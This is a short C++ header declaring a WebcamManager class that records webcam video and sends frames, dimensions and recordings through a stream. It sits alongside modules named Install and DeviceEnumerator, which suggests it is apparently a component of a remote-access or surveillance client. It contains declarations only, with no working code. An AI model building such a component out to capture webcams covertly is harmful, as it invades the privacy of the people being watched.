#ifndef CLIENT_WEBCAMMANAGER_H
#define CLIENT_WEBCAMMANAGER_H
#include <winsock2.h>
#include <string>
#include <thread>
#include <utility>
#include <opencv2/opencv.hpp>
#include "../stream/Stream.h"
#include "../time/Time.h"
#include "../install/Install.h"
#include "../configuration.h"

#include "../video_audio/DeviceEnumerator.h"


class WebcamManager : public Sender {
private:
    // information related to recording
    int webcamID;
    bool fragmented;
    int FPS;
    std::wstring locationOfVideos;
    // video and file managing
    cv::VideoWriter output;
    std::vector<std::wstring> pathVector;
    std::wstring fileName;
    boolean initialized = false;

    void sendRecord();
    void removeTempFiles();
    void sendFrame(const cv::Mat&);
    void sendDimensions(int,int);

public:
    explicit WebcamManager(const Stream &);
    void startWebcam();

    void send() override;


};
#endif